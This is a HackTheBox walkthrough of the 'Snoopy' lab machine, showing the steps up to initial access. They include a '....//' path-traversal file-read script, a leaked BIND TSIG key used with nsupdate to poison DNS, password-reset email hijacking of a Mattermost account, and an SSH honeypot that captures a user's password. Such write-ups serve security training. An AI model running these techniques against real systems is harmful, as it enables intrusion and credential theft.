HTB: Snoopy
===========

![Snoopy](https://0xdf.gitlab.io/img/snoopy-cover.png)

Snoopy starts off with a website that has a file read / directory traversal vulnerability. I’ll use that to read a bind DNS configuration, and leak the keys necessary to make changes to the configuration. Once that’s updated, I can direct password reset emails for accounts on snoopy.htb to my server, and get access to a MatterMost instance. In there, I’ll abuse a slash command intended to provisions servers to have it connect to my SSH honeypot, and use those creds to get on the box. The next two steps both involve CVEs that didn’t have public exploits or even much documentation at the time Snoopy released. First I’ll exploit a CVE in git for how the apply command allows overwriting arbitrary files. Then I’ll exploit an XXE vulnerability in ClamAV’s clamscan utility to read root’s SSH key. In Beyond Root, I’ll reconfigure the box back before a patch from HackTheBox and show two unintended exploits that no longer work.

## Box Info

Name[Snoopy](https://www.hackthebox.com/machines/snoopy) [![Snoopy](https://0xdf.gitlab.io/icons/box-snoopy.png)](https://www.hackthebox.com/machines/snoopy)

[Play on HackTheBox](https://www.hackthebox.com/machines/snoopy)Release Date[06 May 2023](https://twitter.com/hackthebox_eu/status/1654141355583590402)Retire Date23 Sep 2023OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsHard \[40\]Rated Difficulty![Rated difficulty for Snoopy](https://0xdf.gitlab.io/img/snoopy-diff.png)Radar Graph![Radar chart for Snoopy](https://0xdf.gitlab.io/img/snoopy-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)02:02:14 [![snowscan](https://www.hackthebox.eu/badge/image/9267)](https://app.hackthebox.com/users/9267)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)02:05:42 [![xct](https://www.hackthebox.eu/badge/image/13569)](https://app.hackthebox.com/users/13569)

Creator[![ctrlzero](https://www.hackthebox.eu/badge/image/168546)](https://app.hackthebox.com/users/168546)

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), DNS (53), and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.212
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-09 13:13 EDT
Nmap scan report for 10.10.11.212
Host is up (0.085s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
oxdf@hacky$ nmap -p 22,53,80 -sCV 10.10.11.212
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-09 13:18 EDT
Nmap scan report for 10.10.11.212
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Bind](https://packages.ubuntu.com/search?keywords=bind9) versions, the host is likely running Ubuntu 22.04 jammy.

### Website - TCP 80

#### Site

The site is for a security firm:

![image-20230509134416310](https://0xdf.gitlab.io/img/image-20230509134416310.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

The footer does have an email address:

![image-20230509134621524](https://0xdf.gitlab.io/img/image-20230509134621524.png)

There are some other usernames with emails as well on the “About” page:

![image-20230509134710205](https://0xdf.gitlab.io/img/image-20230509134710205.png)

I’ll note all these down.

The front page has links to `/download` and `/download?file=announcement.pdf`.

![image-20230921093614437](https://0xdf.gitlab.io/img/image-20230921093614437.png)

Both download a zip archive, `press_release.zip`, but they are different sizes:

![image-20230509141625352](https://0xdf.gitlab.io/img/image-20230509141625352.png)

The first one has a PDF. The one without a file parameter contains the announcement PDF, plus an `.mp4` video:

![image-20230509141746351](https://0xdf.gitlab.io/img/image-20230509141746351.png)

The last bit of the video has the product manager’s email again:

![image-20230509141822502](https://0xdf.gitlab.io/img/image-20230509141822502.png)

The “Contact” page has a form to submit questions:

![image-20230509134930957](https://0xdf.gitlab.io/img/image-20230509134930957.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

The banner at the top says:

> Attention: As we migrate DNS records to our new domain please be advised that our mailserver ‘mail.snoopy.htb’ is currently offline.

Submitting the form sends a POST with the data, but the response is just an error:

![image-20230509134806721](https://0xdf.gitlab.io/img/image-20230509134806721.png)

It shows on the page as well:

![image-20230509135026762](https://0xdf.gitlab.io/img/image-20230509135026762.png)

#### Tech Stack

The page URLs show pages ending in `.html`. There is a reference to PHP in the email error, and that POST does go to `/forms/contact.php`. It seems the site is likely built on PHP.

The response headers don’t confirm this:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 09 May 2023 17:43:46 GMT
Content-Type: text/html
Last-Modified: Thu, 20 Apr 2023 17:56:22 GMT
Connection: close
ETag: W/"64417cc6-5b7a"
Content-Length: 23418

```

Going to a 404 url returns the standard nginx 404 page:

![image-20230509135302477](https://0xdf.gitlab.io/img/image-20230509135302477.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html,php` since I’ve seen `.html` pages, and because the mail failure referenced PHP:

```
oxdf@hacky$ feroxbuster -u http://10.10.11.212 -x php,html -C 400,502 --no-recursion --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.212
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [400, 502]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      480l     1818w    23418c http://10.10.11.212/
200      GET      243l      708w    10248c http://10.10.11.212/contact.html
301      GET        7l       12w      178c http://10.10.11.212/assets => http://10.10.11.212/assets/
301      GET        7l       12w      178c http://10.10.11.212/forms => http://10.10.11.212/forms/
200      GET      365l     1261w    16614c http://10.10.11.212/about.html
200      GET      480l     1818w    23418c http://10.10.11.212/index.html
200      GET    43878l   263277w 20568411c http://10.10.11.212/download
200      GET      268l      727w    11115c http://10.10.11.212/team.html
200      GET    43878l   263277w 20568411c http://10.10.11.212/download.php
[####################] - 2m     90000/90000   0s      found:9       errors:0
[####################] - 2m     90000/90000   577/s   http://10.10.11.212/

```

I’m running with `--no-recursion` and `--dont-extract-links` here, as both of these generate a ton of errors that aren’t useful. Nothing too interesting here. I’ll note that `/download` and `/download.php` seem to be the same.

### Subdomain Brute Force

I’ll fuzz the webserver with `ffuf` to look for other virtual host subdomains that return something different from the standard `snoopy.htb` page:

```
oxdf@hacky$ ffuf -u http://10.10.11.212 -H "Host: FUZZ.snoopy.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.212
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.snoopy.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

[Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 94ms]
    * FUZZ: mm

:: Progress: [4989/4989] :: Job [1/1] :: 469 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

I’m using `-mc all` to show all status codes and `-ac` to allow for smart filtering of the common response. It finds one more, `mm`.

I’ll add this to my `/etc/hosts` file:

```
10.10.11.212 snoopy.htb mm.snoopy.htb

```

### Mattermost - TCP 80

Visiting `mm.snoopy.htb` returns a [Mattermost](https://mattermost.com/) page:

![image-20230509142734548](https://0xdf.gitlab.io/img/image-20230509142734548.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

Selecting “View in Browser” leads to a login page:

![image-20230509142837370](https://0xdf.gitlab.io/img/image-20230509142837370.png)

Clicking “Don’t have an account?” just returns a page saying to contact the workspace admin.

The “Forgot your password?” link provides a form:

![image-20230509143635189](https://0xdf.gitlab.io/img/image-20230509143635189.png)

It’s always a good idea to compare a login failure of an account that doesn’t exist with one that I think does. If I enter 0xdf@snoopy.htb, it sends this message:

![image-20230509143706461](https://0xdf.gitlab.io/img/image-20230509143706461.png)

However, if I enter one of the employees from the site, it gives a different error:

![image-20230509143757041](https://0xdf.gitlab.io/img/image-20230509143757041.png)

This seems likely an issue with DNS to the mailserver, as mentioned in the error on the main page. Presumably the same message would have come back if the mail server had been up, but when that fails, it gets this message instead. I could use this to brute force usernames, but I won’t need to.

### DNS - TCP/UDP 53

With DNS listening on TCP, I’ll try a zone transfer on the snoppy.htb domain. It works!

```
oxdf@hacky$ dig axfr snoopy.htb @10.10.11.212

; <<>> DiG 9.18.12-0ubuntu0.22.04.1-Ubuntu <<>> axfr snoopy.htb @10.10.11.212
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 83 msec
;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
;; WHEN: Tue May 09 14:23:31 EDT 2023
;; XFR size: 11 records (messages 1, bytes 325)

```

The various 172.18.0.0/8 IPs suggest perhaps these are containers.

I’m going to hold off on putting these into my `hosts` file for now. `mm` I know returns something different, so that one is worthwhile. I can also see that `mail.snoopy.htb` is not there, which fits with the errors observed above. I’ll keep the others in mind as well.

## Shell as cbrown

### File Read

#### Identify

On seeing a URL like `/download?file=announcement.pdf`, the first thing to check is for a local file include or file read vulnerability. Manually I’ll check in Burp Repeater, but it just returns a 0 byte response:

![image-20230509152805795](https://0xdf.gitlab.io/img/image-20230509152805795.png)

It could be not vulnerable, or there could be some filtering to bypass. I’ll use an LFI wordlist to check a lot at once with `ffuf`:

```
oxdf@hacky$ ffuf -u http://snoopy.htb/download?file=FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snoopy.htb/download?file=FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 95ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 96ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 97ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 97ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 97ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 99ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 101ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 101ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 101ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 103ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 102ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 102ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms]
....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms]
:: Progress: [922/922] :: Job [1/1] :: 470 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

```

Again, I’m using `-mc all` to allow all codes, and `-ac` to let it smart decide what to filter. It seems like the site must be removing `../` in such a way that `....//` becomes `../`. I can verify this manually:

![image-20230509153726493](https://0xdf.gitlab.io/img/image-20230509153726493.png)

The file coming back starts with `PK`, which are the [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) for a zip archive. I’ll try that in a browser, and the resulting zip has the `passwd` file:

![image-20230509154124652](https://0xdf.gitlab.io/img/image-20230509154124652.png)

#### Script

To enumerate the host, I’ll write a quick Python script to allow me to easily pull files and unzip them. I’ll walk through building the script in [this video](https://www.youtube.com/watch?v=2a4OJeSZ_N0):

The final code looks like:

```
#!/usr/bin/env python3

import requests
import sys
import zipfile
from io import BytesIO

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} [full path of file]")
    sys.exit()

fpath = sys.argv[1]
outfile = sys.argv[2] if len(sys.argv) > 2 else None

resp = requests.get(f'http://snoopy.htb/download?file=....//....//....//....//....//{fpath}')

if len(resp.content) == 0:
    print(f"File not found: {fpath}")
    sys.exit()

with zipfile.ZipFile(BytesIO(resp.content)) as zip_file:
    file_path_in_zip = zip_file.namelist()[0]
    with zip_file.open(file_path_in_zip) as file:
        contents = file.read()

if outfile:
    with open(outfile, 'wb') as f:
        f.write(contents)
    print(f"Results written to {outfile}")
else:
    print(contents.decode())

```

#### General Filesystem Enumeration

According to the `passwd` file, the box has six users with shells set:

```
oxdf@hacky$ python read_file.py /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash

```

The website can be accessed with `/proc/self`:

```
oxdf@hacky$ python read_file.py /proc/self/cwd/index.html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  ...[snip]...

```

`/download` doesn’t work, nor with `index.php`, but `/download.php` does:

```
oxdf@hacky$ python read_file.py /proc/self/cwd/download/
File not found: /proc/self/cwd/download/
oxdf@hacky$ python read_file.py /proc/self/cwd/download/index.php
File not found: /proc/self/cwd/download/index.php
oxdf@hacky$ python read_file.py /proc/self/cwd/download.php
<?php
...[snip]...

```

The full file is:

```
<?php

$file = $_GET['file'];
$dir = 'press_package/';
$archive = tempnam(sys_get_temp_dir(), 'archive');
$zip = new ZipArchive();
$zip->open($archive, ZipArchive::CREATE);

if (isset($file)) {
        $content = preg_replace('/\.\.\//', '', $file);
        $filecontent = $dir . $content;
        if (file_exists($filecontent)) {
            if ($filecontent !== '.' && $filecontent !== '..') {
                $content = preg_replace('/\.\.\//', '', $filecontent);
                $zip->addFile($filecontent, $content);
            }
        }
} else {
        $files = scandir($dir);
        foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                        $zip->addFile($dir . '/' . $file, $file);
                }
        }
}

$zip->close();
header('Content-Type: application/zip');
header("Content-Disposition: attachment; filename=press_release.zip");
header('Content-Length: ' . filesize($archive));

readfile($archive);
unlink($archive);

?>

```

It can load a single file or the contents of the `press_package` directory. Can also confirm that it’s using `file_get_content` rather than `include`, so no execution on this path (and it’s not an LFI, though many will call it that). Nothing else useful here.

#### Bind Enumeration

During enumeration the Bind DNS server is running. The main configuration file for Bind is `/etc/bind/named.conf`, which contains global configuration options, such as the location of zone files, logging options, and other server settings.

```
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

```

The config includes a couple other files, and defines an `rndc-key`. That `rndc-key` is important, and I’ll come back to that.

`named.conf.options` is mostly comments, but it does have the `allow-transfer` setting that allows my enumeration [above](#dns---tcpudp-53):

```
options {
        directory "/var/cache/bind";

        // If there is a firewall between you and nameservers you want
        // to talk to, you may need to fix the firewall to allow multiple
        // ports to talk.  See http://www.kb.cert.org/vuls/id/800113

        // If your ISP provided one or more IP addresses for stable
        // nameservers, you probably want to use them as forwarders.
        // Uncomment the following block, and insert the addresses replacing
        // the all-0's placeholder.

        // forwarders {
        //      0.0.0.0;
        // };

        //========================================================================
        // If BIND logs error messages about the root key being expired,
        // you will need to update your keys.  See https://www.isc.org/bind-keys
        //========================================================================
        dnssec-validation no;
        allow-transfer {10.0.0.0/8;};

        //listen-on-v6 { any; };
};

```

`named.conf.local` has more config:

```
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};

```

This also configures the `allow-transfer`. It also has an `allow-update` value, which says that anyone with the `rndc-key` can update!

### Access to Mattermost

#### Update mail.snoopy.htb

The Bind9 docs have a [section on TSIG](https://bind9.readthedocs.io/en/v9_16_22/advanced.html#tsig):

> TSIG (Transaction SIGnatures) is a mechanism for authenticating DNS messages, originally specified in [**RFC 2845**](https://datatracker.ietf.org/doc/html/rfc2845.html). It allows DNS messages to be cryptographically signed using a shared secret. TSIG can be used in any DNS transaction, as a way to restrict access to certain server functions (e.g., recursive queries) to authorized clients when IP-based access control is insufficient or needs to be overridden, or as a way to ensure message authenticity when it is critical to the integrity of the server, such as with dynamic UPDATE messages or zone transfers from a primary to a secondary server.

The docs calls out `nsupdate` as the tool to do dynamic DNS updates with TSIG.

I’ll create a file with the steps I want to do, and another with the key:

```
oxdf@hacky$ cat poison_dns.txt
server 10.10.11.212
zone snoopy.htb
update add mail.snoopy.htb 86400 IN A 10.10.14.6
send
oxdf@hacky$ cat rndc.key
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

```

If I ask the DNS server for `mail.snoopy.htb` before making changes, it comes back empty. I’ll run `nsupdate` and then it shows my IP:

```
oxdf@hacky$ dig mail.snoopy.htb +noall +answer @10.10.11.212
oxdf@hacky$ nsupdate -k rndc.key poison_dns.txt
oxdf@hacky$ dig mail.snoopy.htb +noall +answer @10.10.11.212
mail.snoopy.htb.        86400   IN      A       10.10.14.6

```

It seems this resets every two minutes, so I’ll need to work fast, or be ready to come back and update this again.

#### Capture Email

With the DNS pointed at my host, I’ll run a simple Python SMTP server using the `aoismtpd` module. Just like the `http.server` module, it can be run from the command line to create a simple server like `python -m aiosmtpd -n -l 0.0.0.0:25`. `-n` tells it not to try to set the UID (which is important since I’m not running as root). `-l 0.0.0.0:25` tell it to listen on 25. I’ve got my Python configured with capabilities to allow for listening on low ports:

```
oxdf@hacky$ getcap /usr/bin/python3.11
/usr/bin/python3.11 cap_net_bind_service=ep

```

Alternatively, you could try to install this package as root.

With that running, I’ll request the reset email:

```
oxdf@hacky$ python -m aiosmtpd -n -l 0.0.0.0:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']

MIME-Version: 1.0
Precedence: bulk
To: sbrown@snoopy.htb
Auto-Submitted: auto-generated
Subject: [Mattermost] Reset your password
Content-Transfer-Encoding: 8bit
Date: Tue, 09 May 2023 21:08:16 +0000
Reply-To: "No-Reply" <no-reply@snoopy.htb>
Message-ID: <qt31833ar96e61h3-1683666496@mm.snoopy.htb>
From: "No-Reply" <no-reply@snoopy.htb>
Content-Type: multipart/alternative;
 boundary=52b4c5cd180f7c88b0201b7c0f2e0f8361ac6969fe40e5073a1d5de091cd
X-Peer: ('10.10.11.212', 53380)

--52b4c5cd180f7c88b0201b7c0f2e0f8361ac6969fe40e5073a1d5de091cd
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=UTF-8

Reset Your Password
Click the button below to reset your password. If you didn=E2=80=99t reques=
t this, you can safely ignore this email.

Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D9opkx=
uomfaxkhtwoskxak9msk9fzefkfrpyiexne8g95s675tuj7quytttcmuown )

The password reset link expires in 24 hours.

Questions?
Need help or have questions? Email us at support@snoopy.htb ( support@snoop=
y.htb )
...[snip]...

```

It has a password reset link.

#### Reset and Login

I’ll grab the link above, `http://mm.snoopy.htb/reset_password_complete?token=3D9opkx=
uomfaxkhtwoskxak9msk9fzefkfrpyiexne8g95s675tuj7quytttcmuown`. Visiting the link asks for a new password:

![image-20230509171438255](https://0xdf.gitlab.io/img/image-20230509171438255.png)

Trying to change it will fail:

![image-20230509172553956](https://0xdf.gitlab.io/img/image-20230509172553956.png)

The link has some extra encoding in it that’s handled by SMTP. `=` is used in SMTP to represent the end of a line. So `=3D` is the Quoted printable encoding that represents an actual equals sign.

[This site](https://www.webatic.com/quoted-printable-convertor) will decode it for me:

![image-20230509172703249](https://0xdf.gitlab.io/img/image-20230509172703249.png)

Or I can just replace `=3D` with `=` and remove `=` without a `3D`.

Now on submitting it redirects back to the login page with a message that the password was updated:

![image-20230509173047988](https://0xdf.gitlab.io/img/image-20230509173047988.png)

I’m able to log in.

![image-20230509173132945](https://0xdf.gitlab.io/img/image-20230509173132945.png)

### SSH

#### Mattermost Enumeration

I’m already in two channels. Off-Topic is empty. There are two important things going on in Town Square. First, there are messages about server provisioning:

![image-20230509175430992](https://0xdf.gitlab.io/img/image-20230509175430992.png)

And then later cbrown comes back to it:

![image-20230509175520882](https://0xdf.gitlab.io/img/image-20230509175520882.png)

Between that, there’s a conversation about antivirus:

![image-20230509175549292](https://0xdf.gitlab.io/img/image-20230509175549292.png)

ClamAV is a Linux AV, and it’s running on their servers. This will be useful later.

Finally, sbrown is working on a new module and wants cbrown’s help:

![image-20230509175824987](https://0xdf.gitlab.io/img/image-20230509175824987.png)

If I click on “Find channel” and search for “se”, it finds the Server Provisioning Channel:

![image-20230509175917765](https://0xdf.gitlab.io/img/image-20230509175917765.png)

I’ll join it, but it’s empty.

#### slash commands

Mattermost (like Slack and Discord) supposed slash commands. By starting a message with `/[command]`, it will take some action. For example, putting `/shrug` will print `¯\_(ツ)_/¯`. But there are more complicated actions as well.

By typing `/` the prompt will pop up with all possible commands:

![image-20230509193113410](https://0xdf.gitlab.io/img/image-20230509193113410.png)

Most of these are default Mattermost commands, but `/server_provision` jumps out as different:

![image-20230509193211488](https://0xdf.gitlab.io/img/image-20230509193211488.png)

It doesn’t have a description. Sending it opens a dialog:

![image-20230509193301539](https://0xdf.gitlab.io/img/image-20230509193301539.png)

I’ll fill out the form. The Operating system has two options, but only one that isn’t marked “Disabled”:

![image-20230509193637230](https://0xdf.gitlab.io/img/image-20230509193637230.png)

I’ll put my IP, and start `nc` listening on 2222. On sending, there’s a connection:

```
oxdf@hacky$ nc -lnvp 2222
Listening on 0.0.0.0 2222
Connection received on 10.10.11.212 55630
SSH-2.0-paramiko_3.1.0

```

Once I kill that connection, I get a DM from cbrown:

![image-20230509174852965](https://0xdf.gitlab.io/img/image-20230509174852965.png)

It seems that cbrown is trying to SSH into the given server to do some provisioning!

#### SSH HoneyPot

There are several perfectly good SSH honeypots out there. I found some interesting old Python2 servers, and decided to [make my own](https://www.youtube.com/watch?v=HO1h57CiF98):

When I run my script, it will print the username / password on connecting:

```
oxdf@hacky$ python sshpot.py
Connection from 10.10.11.212: cbrown:sn00pedcr3dential!!!

```

#### Cowrie

Alternatively, I can also just use [cowrie](https://github.com/cowrie/cowrie), which has a Docker container:

```
oxdf@hacky$ docker run -p 2222:2222 cowrie/cowrie:latest
/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:97: CryptographyDeprecationWarning: Blowfish has been deprecated
  b"blowfish-cbc": (algorithms.Blowfish, 16, modes.CBC),
/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:101: CryptographyDeprecationWarning: CAST5 has been deprecated
  b"cast128-cbc": (algorithms.CAST5, 16, modes.CBC),
/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:106: CryptographyDeprecationWarning: Blowfish has been deprecated
  b"blowfish-ctr": (algorithms.Blowfish, 16, modes.CTR),
/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:107: CryptographyDeprecationWarning: CAST5 has been deprecated
  b"cast128-ctr": (algorithms.CAST5, 16, modes.CTR),
2023-05-10T01:53:47+0000 [-] Python Version 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110]
2023-05-10T01:53:47+0000 [-] Twisted Version 22.10.0
2023-05-10T01:53:47+0000 [-] Cowrie Version 2.5.0
2023-05-10T01:53:47+0000 [-] Loaded output engine: jsonlog
2023-05-10T01:53:47+0000 [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 22.10.0 (/cowrie/cowrie-env/bin/python3 3.9.2) starting up.
2023-05-10T01:53:47+0000 [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
2023-05-10T01:53:47+0000 [-] CowrieSSHFactory starting on 2222
2023-05-10T01:53:47+0000 [cowrie.ssh.factory.CowrieSSHFactory#info] Starting factory <cowrie.ssh.factory.CowrieSSHFactory object at 0x7ffa25561fa0>
2023-05-10T01:53:47+0000 [-] Ready to accept SSH connections

```

Now when I submit the provisioning form, there’s a bunch more logs:

```
2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 10.10.11.212:33012 (172.17.0.2:2222) [session: 1686340e31d0]
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] Remote SSH version: SSH-2.0-paramiko_3.1.0
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] SSH client hassh fingerprint: a704be057881f0b1d623cd263e477a8b
